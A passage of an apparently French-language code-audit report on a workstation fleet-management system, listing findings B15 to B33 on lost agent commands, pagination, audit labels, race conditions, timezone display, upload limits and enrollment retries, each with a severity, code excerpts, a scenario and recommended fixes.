frontend/src/services/packages.ts:244-247
  const { data } = await api.get<CommandList>('/commands', {
    params: { package_id: id, page, page_size: 50 },
  });

PackageDetailPage.vue:313-320
          <q-table
            :rows="commands"
            ...
            :rows-per-page-options="[0]"
            hide-pagination
```

**Scénario.** L'admin installe LibreOffice sur un site de 180 postes. La page du paquet liste 50 lignes « Réussie ». Les 130 autres, dont d'éventuels échecs ou commandes « Transmise » bloquées, sont invisibles : il conclut à tort que le déploiement a réussi partout.

**Recommandation.** Brancher la pagination serveur (rowsNumber = total, @request) comme MachineCommandsCard. Ajouter côté backend un agrégat par statut pour un package_id (GROUP BY status, éventuellement filtré sur le dernier déploiement) et l'afficher en tête du tableau, avec un filtre par statut.

<a id="b15"></a>

#### B15 — Commandes perdues sans retour quand la file en mémoire de l'agent est pleine (16)

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `agent/internal/agent/agent.go:523`

Le serveur passe chaque commande remise au statut DELIVERED au moment où il la renvoie dans la réponse au heartbeat. Ensuite, il ne remet en circulation que les commandes PENDING (agent.py:818). Côté agent, `accept` jette la commande quand le canal de 16 places est plein. Il la retire de la table de dédoublonnage en supposant qu'« un heartbeat ultérieur la reproposera », mais ce n'est jamais le cas. La commande reste donc DELIVERED jusqu'à la purge (365 jours par défaut) : pas d'exécution, pas de résultat, pas de passage à EXPIRED (mark_expired ne traite que les PENDING). En plus, `machines_with_open_command` empêche de la relancer sur ce poste jusqu'à son expires_at.

```
select {
	case a.commands <- cmd:
	default:
		// Backlog full — forget it so a later heartbeat can re-offer it.
		a.release(cmd.ID)
		log.Printf("agent: backlog full (%d), deferring %s (id %s)", ...)
	}
// serveur, agent.py:818 :  .where(Command.status == CommandStatus.PENDING)  puis  cmd.status = CommandStatus.DELIVERED
```

**Scénario.** Un administrateur déploie le lot de rentrée (20 paquets, donc 20 commandes package_install par poste) sur une salle éteinte pendant le week-end. Au premier heartbeat du lundi, le serveur renvoie les 20 commandes et les passe toutes à DELIVERED. Le worker en prend une, 16 entrent dans le canal et les 3 restantes sont jetées avec le message « deferring ». Ces 3 logiciels ne sont jamais installés, la console affiche « transmise » jusqu'à la purge, et tout nouveau déploiement de ces paquets sur ces postes est ignoré comme doublon jusqu'à l'expiration. Le même cas se produit si une analyse complète de plusieurs heures occupe le worker pendant que des commandes de maintenance s'accumulent.

**Recommandation.** Ne jamais jeter une commande déjà acceptée par le serveur. Trois options : rendre la file locale non bornée ou persistante (sur le modèle de queue.Queue), poster un résultat `failed` explicite (« file pleine, à relancer »), ou limiter côté serveur le nombre de commandes remises par heartbeat (LIMIT 16 sur la requête) pour que le reste reste PENDING et soit remis plus tard. Il faut aussi corriger le commentaire, qui décrit un comportement serveur qui n'existe pas.

<a id="b16"></a>

#### B16 — Commandes en attente abandonnées à l'arrêt du service, sans résultat ni nouvelle remise

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `agent/internal/agent/agent.go:546`

À l'arrêt du service (Stop/Shutdown du SCM, mise à jour MSI de l'agent, extinction du poste), le worker sort dès que le contexte est annulé. Les commandes encore dans le canal sont perdues, sans `failed` ni mise en file locale. Le commentaire affirme que « le serveur les repropose au prochain démarrage », ce qui est faux : elles sont déjà DELIVERED et le heartbeat ne remet que les commandes PENDING. Seule la commande en cours d'exécution obtient un résultat, mis en file locale via PostResult/Enqueue.

```
case <-ctx.Done():
			return
		case cmd := <-a.commands:
			if ctx.Err() != nil {
				return
			}
// doc : "commands still waiting are abandoned ... — the server re-offers them at the next start."
```

**Scénario.** Un poste exécute un full_scan (jusqu'à 8 h), avec wu_install et sfc_scan en attente derrière lui. L'utilisateur éteint le poste le soir, ou le MSI de mise à jour redémarre le service. Le full_scan est rapporté comme interrompu, mais wu_install et sfc_scan restent « transmise » jusqu'à la purge (365 jours par défaut) dans la console, et les relancer est refusé comme doublon tant que leur TTL court.

**Recommandation.** Au moment de l'arrêt, vider le canal et enregistrer pour chaque commande non exécutée un résultat `failed` (« interrompue par l'arrêt de l'agent, à relancer ») dans queue.Queue, qui sera rejoué au prochain contact. Autre option : persister les identifiants acceptés et les reprendre au démarrage. Côté serveur, on peut aussi expirer les DELIVERED sans résultat au-delà d'expires_at.

<a id="b17"></a>

#### B17 — Une intervention « Maintenance » saisie (ou supprimée) dans le journal ne met pas à jour le cycle du poste

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/interventions.py:148` · aussi : `frontend/src/components/machine/MachineHistoryCard.vue:73`

La date last_maintenance_at est décrite comme « dénormalisée depuis le journal » (machine/models.py). Elle n'est pourtant mise à jour que par crud.record_session (POST /maintenance). Les routes create, update et delete de /interventions ne la touchent jamais. Le journal de la fiche propose pourtant le type « Maintenance » (INTERVENTION_KINDS dans services/interventions.ts, utilisé par MachineHistoryCard.vue). Résultat : une maintenance notée à la main ne remet pas le poste « À jour ». À l'inverse, supprimer la ligne d'une séance saisie par erreur laisse le poste « À jour ».

```
row = Intervention(
        machine_id=machine.id,
        kind=payload.kind.value,
        ...
    )
    session.add(row)
    await session.commit()
```

**Scénario.** Reproduit : un poste vu pour la première fois il y a 100 jours est « overdue ». POST /machines/{id}/interventions {kind:'maintenance'} renvoie 201, mais GET /machines/{id}/maintenance renvoie toujours state=overdue et last_maintenance_at=null. Autre cas : POST /maintenance sur ce poste, puis DELETE /interventions/{intervention_id} (204). Le poste reste state=ok et garde last_maintenance_at, sans plus aucune maintenance dans le journal.

**Recommandation.** Recalculer machine.last_maintenance_at (valeur max de performed_at des interventions kind='maintenance') à chaque création, modification (type ou date) et suppression d'une intervention. Sinon, retirer « Maintenance » des types proposés dans le journal manuel et renvoyer vers l'enregistrement de séance.

*Signalé aussi sous un autre angle :* Une intervention de type « Maintenance » ajoutée depuis l'historique ne fait pas repartir le cycle, et sa suppression ne l'annule pas non plus

<a id="b18"></a>

#### B18 — Les flèches poste précédent/suivant sautent ou répètent des postes avec le tri par défaut (dernier contact)

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/composables/useMachineNavigation.ts:87`

Les voisins sont recalculés à chaque navigation en demandant au serveur la ligne de rang i±1 (une page d'une seule ligne). Le tri par défaut de la liste est last_seen décroissant (machineListTable.ts:29). Or last_seen change toutes les 60 s sur chaque poste allumé. Chaque heartbeat fait remonter son poste au rang 0 et décale d'un cran tous les postes situés au-dessus de son ancien rang. Le rang i mémorisé dans l'URL ne désigne donc plus le même poste quelques secondes plus tard.

```
const data = await listMachines({
      ...machineListParamsFromQuery(route.query),
      page: rank + 1,
      page_size: 1,
    });
```

**Scénario.** Sur un parc de 300 postes allumés triés par « Vu le », on ouvre le poste X au rang 5. Avant le clic sur « Suivant », un poste situé plus bas émet son heartbeat et remonte au rang 0. X glisse alors au rang 6, si bien que « Suivant » (rang 6) rouvre X lui-même. En parcourant dix fiches de suite, on revoit certains postes et on en manque d'autres, tandis que le libellé « Poste 7 sur 300 » laisse croire à un parcours fiable.

**Recommandation.** Ancrer le parcours sur un critère stable : passer un curseur (last_seen et id du poste courant) au lieu d'un rang absolu. Sinon, figer l'instantané des identifiants de la page au moment de l'ouverture, ou désactiver les flèches quand le tri porte sur last_seen.

<a id="b19"></a>

#### B19 — Après une fusion, le journal des interventions de la fiche n'est pas rechargé

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/MachineDetailPage.vue:444`

La fusion rattache côté serveur les interventions de la source à la cible (intervention_crud.move_to). Mais l'événement merged de la boîte de dialogue appelle seulement load(), c'est-à-dire fetchAll, qui ne recharge pas les interventions : elles sont chargées à part par loadInterventions(1). L'onglet Historique et son badge restent sur l'état d'avant la fusion jusqu'au prochain rechargement complet de la page. Les autres actions qui modifient le journal (onCheckClosed, onMaintenanceChanged) rappellent bien loadInterventions(1).

```
<MachineMergeDialog
      v-model="mergeOpen"
      ...
      @merged="load"
    />
```

**Scénario.** Un administrateur fusionne l'ancien enregistrement d'un poste, qui porte 6 interventions, dans le nouveau, qui n'en a aucune. La notification annonce « Postes fusionnés », mais l'onglet Historique reste vide et sans badge. Il en conclut que l'historique a été perdu et risque de ressaisir les interventions.

**Recommandation.** Brancher @merged sur un gestionnaire qui appelle à la fois load() et loadInterventions(1), sur le modèle de onCheckClosed.

<a id="b20"></a>

#### B20 — Catalogue logiciel : recherche et page absentes de l'URL, et date « Vu depuis » affichée en UTC

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/SoftwarePage.vue:86` · aussi : `frontend/src/pages/SoftwarePage.vue:111`

La recherche, le tri et la page du catalogue ne vivent que dans des ref locales (search, pagination). Ils ne passent jamais dans l'URL. Le bouton « N poste(s) » ouvre la liste filtrée par software_id, et revenir en arrière remonte la page à zéro : recherche vide, page 1, tri par défaut. Par ailleurs, first_seen est un datetime UTC (par exemple 2026-10-06T05:00:00Z), mais il est affiché avec formatDate, prévue pour les dates sans heure. Cette fonction ne lit que les dix premiers caractères, donc la date affichée est celle d'UTC et non celle du fuseau local. L'export fait de même avec entry.first_seen.date().

```
<q-td :props="props">{{ formatDate(props.value) }}</q-td>   // props.value = first_seen (datetime)
const search = ref('');
```

**Scénario.** À Papeete (UTC−10), un logiciel est détecté pour la première fois le 05/10 à 20 h, heure locale, et la colonne affiche 06/10. L'utilisateur cherche « java », passe en page 3, ouvre « 12 poste(s) » puis revient en arrière : la recherche est vide et la page 1 du catalogue complet s'affiche.

**Recommandation.** Synchroniser search, sortBy, descending, page et rowsPerPage avec route.query, comme dans MachinesPage. Pour first_seen, utiliser formatDateTime ou convertir la date dans le fuseau du navigateur avant de n'en garder que le jour.

*Signalé aussi sous un autre angle :* Page Logiciels : la recherche, le tri et la page ne sont pas dans l'URL, et le retour arrière perd l'état

<a id="b21"></a>

#### B21 — « Une seule vérification ouverte par poste » : en concurrence, erreur 500 à la création et double écriture au journal à la clôture

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/checks.py:235` · aussi : `backend/app/api/routes/checks.py:308`, `backend/app/api/routes/checks.py:477`

create_check et create_checks_bulk vérifient l'unicité en lisant d'abord la base, puis insèrent. Seul l'index partiel uq_machine_checks_open protège en cas de concurrence, et l'IntegrityError qu'il lève n'est pas traduite en 409 : elle aboutit au gestionnaire générique, qui renvoie 500. En bulk, une seule collision annule tout le lot. close_check lit closed_at sans verrou (pas de with_for_update) : deux clôtures simultanées passent toutes les deux et ajoutent chacune une intervention « Vérification ». La dernière écrase aussi closed_by et closing_note.

```
if await crud.open_for_machine(session, machine.id) is not None:
        raise AppError(... CHECK_ALREADY_OPEN ...)
    ...
    session.add(row)
    ...
    await session.commit()
--- close_check :
    if row.closed_at is not None: ...
    session.add(Intervention(... kind=InterventionKind.VERIFICATION.value ...))
```

**Scénario.** Deux opérateurs sélectionnent en même temps 50 postes, dont le même PC-12, et cliquent « Demander une vérification ». Le second commit viole l'index : 500 « erreur interne » et aucune de ses 50 demandes n'est créée, alors que l'API annonce « skipped ». Autre cas : deux techniciens cliquent « Clore » sur la même tâche depuis « Mes tâches » ; l'historique du poste affiche deux lignes « Vérification » et la note du premier est perdue.

**Recommandation.** Intercepter l'IntegrityError de uq_machine_checks_open et renvoyer 409 CHECK_ALREADY_OPEN ; en bulk, utiliser INSERT ... ON CONFLICT DO NOTHING sur l'index partiel et compter les lignes réellement insérées. Pour la clôture, faire un UPDATE ... WHERE closed_at IS NULL RETURNING (ou SELECT ... FOR UPDATE) et renvoyer 409 si aucune ligne n'est modifiée.

<a id="b22"></a>

#### B22 — Sortir une salle de son bâtiment efface silencieusement son emplacement et fait disparaître les signalements de divergence

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/components/room/RoomFormDialog.vue:89`

Une salle rattachée à un bâtiment a location=NULL : le backend la vide (rooms.py, update_room). À l'ouverture du formulaire, form.location reprend room.location, donc null, et non l'emplacement effectif hérité du bâtiment. Si l'utilisateur choisit « Aucun bâtiment » sans remplir le champ qui apparaît, la salle n'a plus d'emplacement. delete_building, lui, recopie l'emplacement sur ses salles : la même opération faite salle par salle se comporte différemment.

```
form.location = props.room?.location ?? null;
...
      location: form.building_id ? null : form.location?.trim() || null,
```

**Scénario.** La salle B12 du bâtiment B (site « Lycée Nord ») est détachée pour corriger une erreur de rattachement. Le champ Emplacement apparaît vide, l'utilisateur enregistre. effective_location devient null, les postes de B12 dont l'agent déclare « Lycée Sud » ne sont plus comptés comme divergents (location_mismatch exige un emplacement des deux côtés), et un compte limité au site « Lycée Nord » perd l'accès à la salle.

**Recommandation.** Pré-remplir form.location avec room.effective_location quand on passe à « Aucun bâtiment ». Côté backend, si building_id passe à null sans location fournie, recopier l'emplacement de l'ancien bâtiment comme le fait detach_building.

<a id="b23"></a>

#### B23 — Session expirée : toasts « Identifiants invalides » trompeurs, un par requête en cours

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/services/session.ts:131`

Quand le refresh échoue, le gestionnaire 401 appelle onSessionLost puis relance l'erreur d'origine vers chaque appelant. Un jeton d'accès expiré, ou appartenant à un compte désactivé, est refusé par _authenticate avec le code auth.credentials.invalid. Après un changement de mot de passe, tant que le jeton d'accès n'a pas expiré, la session révoquée répond en revanche auth.session.invalid, déjà libellé « Votre session a pris fin ». Le front traduit ce code par « Identifiants invalides ». Les pages (UsersPage, AuditPage, SettingsPage, GroupsPage…) attrapent l'erreur et affichent ce toast global, qui reste visible sur la page de connexion. L'utilisateur n'a pourtant saisi aucun identifiant.

```
session.ts l.128-133 :
    try { await deps.refresh(); } catch { deps.onSessionLost(); throw error; }
deps.py l.121-122 : except InvalidTokenError:
        raise credentials_error from None   # code AUTH_CREDENTIALS_INVALID
errors.ts l.18 : 'auth.credentials.invalid': 'Identifiants invalides',
```

**Scénario.** Un opérateur laisse l'onglet Journal d'audit ouvert plus de 7 jours (REFRESH_TOKEN_EXPIRE_DAYS). Il change ensuite un filtre. Le jeton d'accès a expiré, donc 401 auth.credentials.invalid, puis le refresh renvoie aussi 401. La console redirige vers /login et affiche « Identifiants invalides » (plusieurs fois si plusieurs requêtes étaient en cours), comme si le mot de passe saisi était faux.

**Recommandation.** Après onSessionLost, rejeter avec une erreur marquée « session terminée » (par exemple un code auth.session.invalid synthétique, ou un flag que apiErrorMessage reconnaît), ou supprimer les toasts pour ce cas et afficher un seul message « Votre session a pris fin » sur la page de connexion.

<a id="b24"></a>

#### B24 — Longueur minimale du mot de passe et durée du lien de réinitialisation codées en dur dans le front alors qu'elles sont configurables

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/services/users.ts:5` · aussi : 

PASSWORD_MIN_LENGTH et PASSWORD_RESET_EXPIRE_MINUTES sont des variables d'environnement documentées (DEPLOYMENT.md, deploy/.env.example, aperçu de l'environnement dans Paramètres). Le backend applique leur valeur (fields.Password, e-mail de réinitialisation). Le front fige pourtant 12 caractères pour les formulaires UsersPage, AccountPage et ResetPasswordPage, et « une heure » dans ForgotPasswordPage. Si la configuration change, le front et le back ne disent plus la même chose. Un refus du backend donne seulement une 422 request.validation_error, affichée « Requête invalide » sans explication.

```
users.ts l.5 : export const PASSWORD_MIN_LENGTH = 12;
fields.py : Password = Annotated[str, Field(min_length=settings.PASSWORD_MIN_LENGTH)]
ForgotPasswordPage.vue l.54 : « … vient d'être envoyé. Il expire dans une heure. »
```

**Scénario.** Le déploiement met PASSWORD_MIN_LENGTH=16. Un utilisateur choisit un mot de passe de 13 caractères sur /reset-password. Le front le valide (« 12 caractères minimum »), le backend répond 422 et le toast affiche « Requête invalide » : l'utilisateur ne sait pas quoi corriger. Inversement, avec PASSWORD_MIN_LENGTH=8, le front refuse des mots de passe que le serveur accepterait. Avec PASSWORD_RESET_EXPIRE_MINUTES=15, la page annonce « une heure » alors que l'e-mail dit 15 minutes.

**Recommandation.** Exposer ces valeurs dans un endpoint public léger (ou dans la réponse de /auth/me pour les pages authentifiées) et les lire côté front. À défaut, traduire la 422 sur new_password/password en message « au moins N caractères » à partir des détails de validation.

*Signalé aussi sous un autre angle :* La longueur minimale du mot de passe est fixée à 12 dans le frontend, alors qu'elle se configure côté serveur

<a id="b25"></a>

#### B25 — Le journal d'audit ne sait ni nommer ni filtrer les actions sur les paquets, user.locked et machine.reenroll_requested

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/utils/auditLabels.ts:53`

Le backend enregistre resource_type="package" et les actions package.create, package.update, package.upload, package.sign, package.unsign, package.retire, package.restore et package.file_delete, ainsi que user.locked et machine.reenroll_requested. AUDIT_RESOURCE_TYPE_LABELS, qui sert à la fois aux libellés et aux options du filtre « Type de ressource », n'a pas d'entrée « package ». Le filtre ne permet donc pas d'isoler les actions sur les paquets, et la colonne Ressource affiche le slug brut. Les dix actions citées n'ont pas de libellé français : le tableau et le filtre Action affichent le slug technique.

```
auditLabels.ts l.44-54 : AUDIT_RESOURCE_TYPE_LABELS = { machine, command, room, building, intervention, check, user, group, settings }   // pas de package
AuditFiltersBar.vue l.137 : const resourceTypeOptions = Object.entries(AUDIT_RESOURCE_TYPE_LABELS).map(...)
backend : audit.record(..., action="package.retire", resource_type="package", ...)
```

**Scénario.** Un auditeur veut savoir qui a retiré ou signé des paquets ce mois-ci. Le filtre « Type de ressource » ne propose pas « Paquet ». Le filtre Action affiche « package.retire », « package.sign »… au milieu des libellés français, et un verrouillage de compte apparaît comme « user.locked ».

**Recommandation.** Ajouter package: 'Paquet' à AUDIT_RESOURCE_TYPE_LABELS, ainsi que les libellés des actions package.*, user.locked et machine.reenroll_requested. Ajouter aussi un test qui compare la liste des slugs émis par audit.record côté backend à celle du front.

<a id="b26"></a>

#### B26 — Utilisateurs : supprimer le dernier compte d'une page laisse un tableau vide

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/UsersPage.vue:395`

reload() recharge la page en cours sans vérifier qu'elle existe encore. AuditPage gère ce cas (repli sur la dernière page si items est vide alors que total > 0), mais UsersPage ne le fait pas. Après la suppression qui vide la dernière page, le tableau affiche « aucune donnée » alors que des comptes existent.

```
UsersPage.vue l.394-397 :
    const data = await listUsers(params);
    if (id !== requestId) return;
    rows.value = data.items;
    pagination.value = { ...pagination.value, rowsNumber: data.total };
```

**Scénario.** 26 comptes, 25 par page. L'administrateur va en page 2 (un seul compte) et le supprime. reload() demande page=2, reçoit items=[] et total=25. Le tableau est vide avec une pagination « 26-25 sur 25 », et l'utilisateur doit revenir lui-même en page 1.

**Recommandation.** Reprendre la logique d'AuditPage.load : si items est vide, que total > 0 et que page > 1, se placer sur Math.ceil(total / rowsPerPage) et recharger.

<a id="b27"></a>

#### B27 — PATCH /users/{id} et /groups/{id} : un champ obligatoire envoyé à null provoque une 500

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/users.py:337` · aussi : `backend/app/api/routes/rooms.py:571`

UserUpdate accepte email, is_active et email_preference à null, et GroupUpdate accepte name à null. Les routes appliquent tout ce qui est présent dans model_dump(exclude_unset=True) par setattr. Une valeur null sur une colonne NOT NULL fait échouer le flush (IntegrityError), d'où une 500 au lieu d'une 422. Pour email=null, et pour le nom d'une salle (rooms.py, _clean_name), la 500 vient plus tôt, d'une AttributeError : normalize_email et _clean_name appellent une méthode de chaîne sur None. Pour is_active=null, `not fields["is_active"]` vaut True : la requête suit en plus le chemin « désactivation » (refus sur soi-même, revoke_all) avant d'échouer.

```
users.py l.111 : email: Email | None = None
l.337 : deactivating = "is_active" in fields and not fields["is_active"]
l.355-358 : for name, value in fields.items(): ... setattr(user, name, stored)
groups.py l.118 : name: str | None = Field(default=None, min_length=1, max_length=100)
```

**Scénario.** Un client API ou un script envoie PATCH /users/<id> {"email": null}, ou PATCH /groups/<id> {"name": null}. Le serveur répond 500 internal.server_error, la console affiche « Erreur interne du serveur » et le journal applicatif reçoit une trace d'IntegrityError (AttributeError pour email).

**Recommandation.** Refuser null sur ces champs avec un validateur Pydantic (model_validator qui rejette None pour email, is_active, email_preference et name), ou les typer sans None en gardant exclude_unset pour le caractère partiel.

*Signalé aussi sous un autre angle :* Un PATCH avec name: null provoque une erreur 500 au lieu d'une 422

<a id="b28"></a>

#### B28 — Ordre de remise des commandes non déterministe : « installer les MAJ puis redémarrer » peut s'exécuter à l'envers

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/agent.py:815`

La requête qui sélectionne les commandes à remettre n'a pas d'ORDER BY. L'agent les exécute pourtant strictement dans l'ordre reçu (canal FIFO, un seul worker), et il refuse toute commande reçue après un redémarrage ou un arrêt programmé (power.pending → `failed` « à relancer »). L'ordre dans lequel l'administrateur a mis les commandes en file n'est donc pas garanti : PostgreSQL rend l'ordre physique ou celui de l'index ix_commands_machine_status, qui varie après UPDATE et VACUUM.

```
rows = await session.exec(
        select(Command)
        .where(Command.machine_id == machine.id)
        .where(Command.status == CommandStatus.PENDING)
        .where(Command.expires_at > now)
        .where(col(Command.type) != CommandType.WAKE_ON_LAN.value)
    )
```

**Scénario.** Une salle est éteinte. L'admin lance « Installer les mises à jour », puis « Redémarrer le poste ». Au retour, un poste reçoit [reboot, wu_install] : le reboot est programmé, puis le wu_install est refusé (« un redémarrage de ce poste est déjà programmé »). Les MAJ ne sont pas installées. Même problème pour un package_install et un package_uninstall du même paquet : l'état final dépend du hasard.

**Recommandation.** Ajouter `.order_by(col(Command.created_at), col(Command.id))` à la sélection du heartbeat, et garder cet ordre pour la liste `commands` renvoyée. Ajouter un test qui met deux commandes en file et vérifie l'ordre de remise.

<a id="b29"></a>

#### B29 — Réveil relayé capté par un agent incapable de l'exécuter : le réveil est perdu sans repli

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `backend/app/features/wol/relay.py:344`

claim_wakes attribue le réveil au premier poste éligible selon l'emplacement ou le domaine et le sous-réseau, sans regarder la version de l'agent. Un agent antérieur à la fonction (wake_on_lan inconnu) reçoit la commande, la journalise comme « unknown command type, ignoring » et ne renvoie aucun résultat. Comme claim_wakes ne reprend que les lignes où `relay_machine_id IS NULL`, aucun autre poste ne tente le réveil. Pendant tout le TTL, open_wake_for fait répondre « déjà transmis à un poste relais » à chaque nouveau clic. Le cas concerne surtout les cibles sans emplacement, éligibles par domaine, sur un parc qui mélange plusieurs versions d'agent.

```
for command, target in (await session.exec(stmt)).all():
        if not may_claim(relay, target, queued_at=command.created_at, now=now):
            continue
        ...
        command.relay_machine_id = relay.id
        command.status = CommandStatus.DELIVERED.value
```

**Scénario.** WOL_RELAY_ENABLED est actif sur un parc mono-domaine sans `location`. Un poste encore en agent ancien heartbeate le premier et capte le réveil d'une salle. Aucun paquet magique n'est émis, l'admin voit « déjà transmis » à chaque essai, et le réveil n'aboutit pas tant que ce poste capte les demandes : chaque ligne expire après WOL_RELAY_TTL_MINUTES (10 par défaut), puis un nouveau clic relance la même course.

**Recommandation.** Exclure de claim_wakes les relais dont agent_version est inférieure à la version qui gère wake_on_lan. En complément, remettre en PENDING avec relay_machine_id=NULL une ligne DELIVERED sans verdict après un court délai (par exemple 2 heartbeats), pour qu'un autre relais la reprenne.

<a id="b30"></a>

#### B30 — Le dialogue de déploiement permet d'envoyer un paquet qu'il déclare lui-même inexécutable

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/components/package/PackageDeployDialog.vue:125`

Pour un paquet de fichiers non signé dont l'exécutable n'a pas d'éditeur reconnu (trustMethod 'none'), le dialogue affiche « aucun poste ne l'exécutera. Signez le paquet avant de le déployer. », mais `ready` ne regarde que deployable() (non retiré, aucun problème). Le bouton reste actif. Le backend (_deployable_package) n'exige pas non plus de signature. Le cas typique est une installation passant par msiexec, que trustMethod classe toujours 'none' sans signature.

```
const ready = computed(() => {
  if (!chosen.value || (action.value === 'install' && !deployable(chosen.value))) return false;
  if (action.value === 'uninstall' && !canUninstall.value) return false;
  if (!props.machineIds?.length && scope.value === 'location' && !location.value) return false;
  return true;
});
```

**Scénario.** L'admin crée un paquet MSI (install_run = msiexec) sans le signer, puis clique « Installer sur tout le parc ». 300 commandes sont créées, toutes refusées par les postes : 300 échecs à analyser, alors que la console savait d'avance que rien ne serait exécuté.

**Recommandation.** Désactiver l'envoi quand trustMethod(chosen) === 'none' pour une installation, et refuser aussi côté serveur (409 PACKAGE_NOT_READY avec un problème « non signé ») un package_install de type files sans signature ni éditeur sur l'exécutable lancé.

<a id="b31"></a>

#### B31 — Plafond Caddy (2 GB décimaux, par requête) plus strict que le backend (2 Gio, par fichier) : 413 inattendu au dépôt

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `deploy/Caddyfile:60`

Caddy limite le corps entier de POST /packages/{id}/files à `2GB`, soit 2 000 000 000 octets en unités SI. Le backend accepte jusqu'à PACKAGE_MAX_BYTES = 2·1024³ = 2 147 483 648 octets, par fichier. La page permet de sélectionner plusieurs fichiers envoyés dans une seule requête. Un installateur entre 2,0 et 2,147 Go, ou plusieurs fichiers dont la somme dépasse 2 Go, sont refusés en 413 par Caddy avant le backend, alors que DEPLOYMENT.md présente les deux plafonds comme alignés. Le front affiche seulement « Dépôt impossible ».

```
request_body @package_upload {
			max_size 2GB
		}

backend/app/core/config.py:453
    PACKAGE_MAX_BYTES: int = Field(default=2 * 1024**3, ...)
```

**Scénario.** L'admin sélectionne l'ISO-installateur d'Office (1,2 Go) et son fichier de configuration avec un pack de langue (0,9 Go), puis clique « Déposer ». Caddy coupe à 2 Go avec un 413 générique : rien n'est déposé, et la limite affichée côté serveur (2 Gio par fichier) laissait croire que l'envoi passerait.

**Recommandation.** Écrire `max_size 2GiB` (ou dériver la valeur de PACKAGE_MAX_BYTES). Côté front, envoyer un fichier par requête (boucle séquentielle avec progression globale) ou vérifier la taille de la sélection avant l'envoi. Traduire le 413 de Caddy en message explicite.

<a id="b32"></a>

#### B32 — Échec transitoire de lecture de token.dat : réenrôlement bloqué en attente d'approbation, poste hors ligne alors que son jeton est valide

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `agent/internal/config/config.go:293`

LoadToken renvoie "" pour toute erreur, pas seulement pour un fichier absent. Cela inclut un verrou de partage posé par un antivirus au démarrage, une I/O ponctuelle ou une entropie de registre momentanément illisible, qui fait échouer DPAPI. L'agent tente alors un enrôlement avec le secret de flotte. Le jeton existant étant toujours actif côté serveur, avec ENROLLMENT_REENROLL_REQUIRES_APPROVAL=true par défaut, l'enrôlement est mis en attente d'approbation et renvoie 403. ensureEnrolled ne relit jamais token.dat : cfg.AuthToken reste vide jusqu'au redémarrage du service. Le poste ne fait donc plus de heartbeat, alors qu'il détient sur disque un jeton parfaitement valide.

```
raw, err := os.ReadFile(tokenPath(dir))
	if err != nil {
		if !os.IsNotExist(err) {
			log.Printf("config: stored token unreadable (%v); treating as not enrolled", err)
		}
		return "", nil
	}
// agent.go:269  if a.cfg.AuthToken != "" { return nil }  → Enroll → 403 MACHINE_ENROLLMENT_APPROVAL_REQUIRED (agent.py:575)
```

**Scénario.** Au démarrage, l'antivirus tiers analyse C:\ProgramData\Tiai\token.dat et le verrouille, ce qui provoque une erreur de partage. L'agent journalise « treating as not enrolled » et appelle /agent/enroll. Le serveur répond 403 « approval required », enregistre reenroll_requested_at et affiche le poste comme demandant un réenrôlement. L'agent recommence toutes les ≤ 5 min sans jamais relire le fichier. Le poste apparaît hors ligne jusqu'à ce qu'un administrateur approuve, ce qui génère un nouveau jeton sans raison, ou jusqu'à un redémarrage du service.

**Recommandation.** Ne traiter comme « non enrôlé » qu'un fichier absent ou dont le contenu est corrompu de manière certaine. Pour une erreur d'I/O ou d'accès, renvoyer une erreur réessayable, puisque runAgent réessaie déjà le chargement. Autre solution : avant chaque tentative d'enrôlement, relire token.dat via config.LoadToken et ne pas enrôler si un jeton y est lisible.

<a id="b33"></a>

#### B33 — Poste en attente d'approbation : chaque tentative d'enrôlement écrit une entrée d'audit (≈ 384/jour/poste)

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/agent.py:556`

L'agent ne fait pas la différence entre « réenrôlement en attente d'approbation » ou « machine révoquée » (403 définitifs) et une panne réseau. Il réessaie au rythme du backoff, plafonné à backoff_max_seconds (300 s) et tiré au hasard entre la moitié et la totalité du palier (jitterBackoff) : une tentative toutes les 150 à 300 s, soit 288 par jour au minimum et environ 384 en moyenne. Côté serveur, chaque tentative refusée pour approbation écrit et committe une ligne d'audit `machine.reenroll_requested` et un warning dans le journal de sécurité, et réécrit reenroll_requested_at/ip. Aucun dédoublonnage n'existe (audit.record ajoute toujours une ligne). C'est pourtant le cas nominal d'un poste réinstallé.

```
machine.reenroll_requested_at = utcnow()
            machine.reenroll_requested_ip = ip
            audit.record(
                session,
                actor="agent",
                action="machine.reenroll_requested",
...
            await session.commit()
// agent.go:214-217 : tick en erreur → nextBackoff plafonné à BackoffMaxSeconds (300 s par défaut)
```

**Scénario.** Une salle de 30 postes est réimagée le vendredi soir, l'approbation n'a lieu que le lundi. Cela fait 30 × 384 ≈ 11 500 entrées d'audit par jour, soit près de 30 000 sur le week-end, toutes identiques (moins si les postes sortent par une même adresse : enroll_limiter plafonne à 30 tentatives par 300 s et par IP). Elles noient les actions administratives dans la page Audit et l'export, et l'horodatage de la demande ne reflète plus la première tentative.

**Recommandation.** Côté agent, reconnaître les codes MACHINE_ENROLLMENT_APPROVAL_REQUIRED et MACHINE_ENROLLMENT_REVOKED (corps du 403) et passer à un backoff long (par exemple 30–60 min). Côté serveur, n'auditer et ne mettre à jour reenroll_requested_at que si aucune demande n'est déjà en cours, ou si la précédente date de plus de N heures.

<a id="b34"></a>

#### B34 — Type de commande inconnu ignoré sans résultat : commande « transmise » sans verdict sur un parc à versions mixtes

